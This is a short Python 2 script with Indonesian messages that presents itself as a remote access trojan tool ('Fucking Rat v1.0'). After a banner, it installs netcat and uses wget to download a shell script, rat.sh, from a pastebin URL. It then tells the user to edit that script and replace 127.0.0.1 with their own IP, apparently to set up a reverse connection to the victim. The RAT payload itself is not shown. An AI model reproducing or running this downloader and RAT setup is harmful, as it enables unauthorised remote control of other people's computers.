#!/usr/bin/python

import os,sys,time,requests,colorama,random

##color##

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta

os.system("clear")

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
        
def banner():
    
    print C+"#############################################"
    print O+"# Tool : Fucking Rat v1.0                   #"
    print T+"#############################################"
    print W+"# Creathor : Mr. Rax0_R3nd                  #"
    print P+"# TEAM : Solo Player                        #"
    print C+"#############################################"
    
mengetik(O+'[+] Assalamualaikum saudaraku')
print
banner()
print
mengetik(R+"Kali ini saya membuat tool Fucking Rat")
print
mengetik(B+"Saya harap kalian menyukain tool saya")
print 
yn = raw_input(G+'Apapkah Kamu Ingin Menjalankan Tool Ini? [Y/n] ')
if yn == 'n':
    pass
if yn == 'y':
    os.system("apt install netcat")
    os.system("wget -O rat.sh https://pastebin.com/raw/rgLiXwE9")
    os.system("apt install net-tools")
    time.sleep(3)
print
mengetik(G+"Now you can edit rat.sh and change 127.0.0.1 to your Ip")
ip = raw_input('Are you like to see your ip [Y/n] ')
if ip == 'n':
    pass
if ip == 'y':
    os.system("ifconfig")
time.sleep(5)
print
mengetik(C+'Special Thanks To :')
print
mengetik(P+'[1] Allah SWT   [2] Nabi Muhammad SAW')
print





